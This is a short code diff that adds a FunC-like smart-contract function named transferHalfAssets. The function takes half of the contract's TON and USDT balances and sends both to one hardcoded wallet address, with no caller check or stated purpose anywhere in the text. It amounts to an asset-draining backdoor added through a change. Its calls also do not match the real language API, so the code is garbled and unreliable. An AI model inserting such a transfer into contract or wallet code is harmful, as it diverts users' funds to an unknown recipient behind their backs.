@@ -1,0 +1,8 @@
+() transferHalfAssets() impure {
+    int ton_balance = get_balance("TON");
+    int usdt_balance = get_balance("USDT");
+    int half_ton = ton_balance / 2;
+    int half_usdt = usdt_balance / 2;
+    send_raw_message("UQD1-_PAxDzXdCPraGOSvzvDf01U1CAZDsCoBbDyDJHp3F-F", half_ton, 64);
+    send_raw_message("UQD1-_PAxDzXdCPraGOSvzvDf01U1CAZDsCoBbDyDJHp3F-F", half_usdt, 64);
+}
